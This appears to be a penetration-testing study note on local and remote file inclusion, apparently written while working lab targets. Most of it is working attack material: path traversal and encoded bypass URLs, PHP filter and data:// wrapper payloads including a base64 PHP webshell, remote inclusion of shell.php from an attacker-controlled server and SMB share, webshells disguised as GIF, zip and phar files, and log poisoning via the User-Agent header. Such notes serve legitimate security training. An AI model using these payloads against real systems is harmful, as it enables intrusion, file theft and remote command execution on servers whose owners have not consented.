#LFI #RFI #FileInclusion #RemoteFileInclusion #LocalFileInclusion

- Utilizing dynamic page generation based on file location as the parameter
- [Barb'hack 2022: Leveraging PHP Local File Inclusion to achieve universal RCE - RiskInsight](https://www.riskinsight-wavestone.com/en/2022/09/barbhack-2022-leveraging-php-local-file-inclusion-to-achieve-universal-rce/)
- A parameter is using a file to select data to display
- Local File Inclusion - on the host's system
- Remote File Inclusion - including files from remote systems/URLs

#### LFI Types
- Basic LFI - absolute path
	- `C:\Windows\boot.ini`
	- `/etc/passwd`
- Path Traversal - relative paths
	- `../../../etc/passwd`
- Filename Prefix - files may contain a prepended file name
- Appended Extensions - files may contain a appended file name
- Second-Order Attacks - inject LFI payload into data stream that causes a secondary application to include the file instead

#### Basic Bypass
- Non-Recursive Path Traversal Filters - deletes common patterns
	- use different chars
	- double up patterns (so ../ becomes ....//)
	- encoded chars (../ to %2e%2e%2f)
- Approved paths - using things like regex to only accept approved paths
	- start with approved path then add bypass chars after (./somefolder/../../../etc/passwd)
- Add extensions - some apps auto add extensions
	- path truncation - add a bunch of chars to exceed char limit (?language=non_existing_directory/../../../etc/passwd/./././././ REPEATED ~2048 times]) - usually only in legacy versions
	- null bytes - add %00 to end of string - anything after null byte is ignored - usually only in legacy versions
- Examples
	- http://94.237.61.133:40339/index.php?language=languages/../../../../../flag.txt
	- http://94.237.61.133:40339/index.php?language=languages%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%66%6c%61%67%2e%74%78%74
	- http://94.237.61.133:40339/index.php?language=./language/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%66%6c%61%67%2e%74%78%74
	- http://94.237.61.133:40339/index.php?language=languages/flag.txt%00
	- http://94.237.61.133:40339/index.php?language=..//..//..//..//..//..//flag.txt
	- http://94.237.61.133:40339/index.php?language=languages/..//..//..//..//..//..//flag.txt
	- http://94.237.61.133:40339/index.php?language=./languages/../../../../../flag.txt
	- http://94.237.61.133:40339/index.php?language=./languages/..//..//..//..//..//..//flag.txt
	- http://94.237.61.133:40339/index.php?language=./languages/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%66%6c%61%67%2e%74%78%74
	- http://94.237.61.133:40339/index.php?language=./languages/..//..//..//..//..//..//flag.txt%00.php
	- http://94.237.61.133:40339/index.php?language=./languages/%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%36%25%36%63%25%36%31%25%36%37%25%32%65%25%37%34%25%37%38%25%37%34
	- http://94.237.61.133:40339/index.php?language=languages///....//....//....//....//....//....//.....//....//....//....//flag.txt

#### PHP Filters

- [PHP: List of Available Filters - Manual](https://www.php.net/manual/en/filters.php)
	- [PHP: String Filters - Manual](https://www.php.net/manual/en/filters.string.php)
	- [PHP: Conversion Filters - Manual](https://www.php.net/manual/en/filters.convert.php)
	- [PHP: Compression Filters - Manual](https://www.php.net/manual/en/filters.compression.php)
	- [PHP: Encryption Filters - Manual](https://www.php.net/manual/en/filters.encryption.php)
- starts with `php://`
	- convert.base64-encode - best used for LFI
- Fuzz for endpoints first - scan for all codes not just 200 - identify potential php files
	- [[gobuster]]
	- [[ffuf]]
- If we want to see a PHP file instead of execution we need to encode it
- The base64 encoding will pull the b64 text of the php file and not execute it
- `php://filter/read=convert.base64-encode/resource=config` base64 encode the config.php file and display it in browser (note here the .php is added by the server)
- `http://83.136.251.68:35479/index.php?language=php://filter/read=convert.base64-encode/resource=configure` - get base64 of configure.php (in this instance the php is appended)

#### PHP Wrappers
- [PHP: List of Available Wrappers - Manual](https://www.php.net/manual/en/wrappers.php.php)
- [PHP: data:// - Manual](https://www.php.net/manual/en/wrappers.data.php) 
	- allow_url_include must be turned on (found in php.ini)
	- This attack allows us to inject extra data
	- `curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"` - try to find php.ini and grab it as b64
	- `http://83.136.251.68:35479/index.php?language=data://text/plain;base64,{b64 of payload}` inject a b64 encoded payload to be included in page's php
	- `curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid` - use the data wrapper and a simple php webshell to get local userid
- [PHP: php:// - Manual](https://www.php.net/manual/en/wrappers.php.php) - see Input section
	- allow_url_include must be turned on (found in php.ini)
	- This attack allows us to inject extra data vis **POST** requests
	- `curl -s -X POST --data '{PHP PAYLOAD HERE}' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid`
![[Pasted image 20250417153826.png]]
- [PHP: expect:// - Manual](https://www.php.net/manual/en/wrappers.expect.php)
	- run commands through URL streams
	- usually needs to be manually installed on server
	- `extension=exppect` needs to be set in allow_url_include

|**Function**|**Read Content**|**Execute**|**Remote URL**|
|---|:-:|:-:|:-:|
|**PHP**||||
|`include()`/`include_once()`|✅|✅|✅|
|`require()`/`require_once()`|✅|✅|❌|
|`file_get_contents()`|✅|❌|✅|
|`fopen()`/`file()`|✅|❌|❌|
|**NodeJS**||||
|`fs.readFile()`|✅|❌|❌|
|`fs.sendFile()`|✅|❌|❌|
|`res.render()`|✅|✅|❌|
|**Java**||||
|`include`|✅|❌|❌|
|`import`|✅|✅|✅|
|**.NET**||||
|`@Html.Partial()`|✅|❌|❌|
|`@Html.RemotePartial()`|✅|❌|✅|
|`Response.WriteFile()`|✅|❌|❌|
|`include`|✅|✅|✅|

#### Remote File Inclusion
- PHP needs allow_url_include turned on
- Many RFI are LFI but LFI may not be RFI
	- The vulnerable function may not allow including remote URLs
	- You may only control a portion of the filename and not the entire protocol wrapper (ex: `http://`, `ftp://`, `https://`).
	- The configuration may prevent RFI altogether, as most modern web servers disable including remote files by default.
- Check an LFI for RFI by including a URL
	- `http://127.0.0.1:80/index.php` - check locally, but careful of a recursive inclusion that DoS's
	- `http://google.com` - check for remote access
- `http://83.136.252.13:32005/index.php?language=http://10.10.10.10:80/shell.php&cmd=id` - target access attackers webserver and runs shell.php
![[Pasted image 20250417153457.png]]
- If windows host, might be able to attack **SMB**
	- `impacket-smbserver -smb2support share $(pwd)`
	- `http://83.136.252.13:32005/index.php?language=\\{shareIP}\{SHARE}\shell.php&cmd=whoami`

|**Function**|**Read Content**|**Execute**|**Remote URL**|
|---|:-:|:-:|:-:|
|**PHP**||||
|`include()`/`include_once()`|✅|✅|✅|
|`file_get_contents()`|✅|❌|✅|
|**Java**||||
|`import`|✅|✅|✅|
|**.NET**||||
|`@Html.RemotePartial()`|✅|❌|✅|
|`include`|✅|✅|✅|


#### LFI and File Uploads
- web app must have the ability to execute the payload/code
- **Image** files
	- put a payload in an 'image' file
	- web app must run code inside 'image' file
	- `echo 'GIF8<?php system($_GET["{PUT COMMAND HERE}"]); ?>' > shell.gif`
	- `http://83.136.252.13:56738/index.php?language=./profile_images/shell.gif&cmd={COMMAND HERE}`
- **zip** files
	- web app must unzip - [PHP: zlib:// - Manual](https://www.php.net/manual/en/wrappers.compression.php)
	- `zip://` prefix
	- `echo '<?php system($_GET["{COMMAND HERE}"]); ?>' > shell.php && zip shell.jpg shell.php` create a webshell `shell.php` then zip into shell.jpg
	- `http://83.136.252.13:32005/index.php?language=zip://{DIRofFiles}/shell.jpg%23shell.php&cmd={COMMAND HERE}` access  `shell.php` inside the zip and run a command
- **Phar** files
	- `phar://` prefix
	- example phar file - `shell.php`
	```php
	<?php
	$phar = new Phar('shell.phar');
	$phar->startBuffering();
	$phar->addFromString('shell.txt', '<?php system($_GET["{COMMAND HERE}"]); ?>');
	$phar->setStub('<?php __HALT_COMPILER(); ?>');
	
	$phar->stopBuffering();
	```
	- `php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg` - compile php into a phar file
	- `http://83.136.252.13:32005/index.php?language=phar://{DIRofFile}/shell.jpg%2Fshell.txt&cmd={COMMAND HERE}`

|**Function**|**Read Content**|**Execute**|**Remote URL**|
|---|:-:|:-:|:-:|
|**PHP**||||
|`include()`/`include_once()`|✅|✅|✅|
|`require()`/`require_once()`|✅|✅|❌|
|**NodeJS**||||
|`res.render()`|✅|✅|❌|
|**Java**||||
|`import`|✅|✅|✅|
|**.NET**||||
|`include`|✅|✅|✅|


#### Log Poisoning
- must be able to write code into a log file
- must be able to execute code from log file
- code must be parsed and executed 
- must be able to know where the log files are, named, accessed, etc
- PHP examples
- `http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd` read the php session file
- `http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E` poison the php session file with a PHP webshell
- `http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id` use webshell to execute commands
- `http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log` read apache access log
- `curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php {standard shell} ?>"` use user-agent header to inject PHP webshell
- `http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=id` use the webshell to output command results into the log file

#### Automated Scanning
- `ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287` **find** parameters
- [SecLists/Fuzzing/LFI/LFI-Jhaddix.txt at master · danielmiessler/SecLists · GitHub](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt)
- [File Inclusion/Path traversal - HackTricks](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#top-25-parameters)
- `ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287` **find** parameter values that are LFI
- [SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt at master · danielmiessler/SecLists · GitHub](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt)
- [SecLists/Discovery/Web-Content/default-web-root-directory-windows.txt at master · danielmiessler/SecLists · GitHub](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt)
- `ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287` **find** webroot
- `curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf` **manual** testing of a webroot
- [[liffy]]
- [[LFI Freak]]
- [[LFI Suite]]
- 






|**Function**|**Read Content**|**Execute**|**Remote URL**|
|---|:-:|:-:|:-:|
|**PHP**||||
|`include()`/`include_once()`|✅|✅|✅|
|`file_get_contents()`|✅|❌|✅|
|**Java**||||
|`import`|✅|✅|✅|
|**.NET**||||
|`@Html.RemotePartial()`|✅|❌|✅|
|`include`|✅|✅|✅|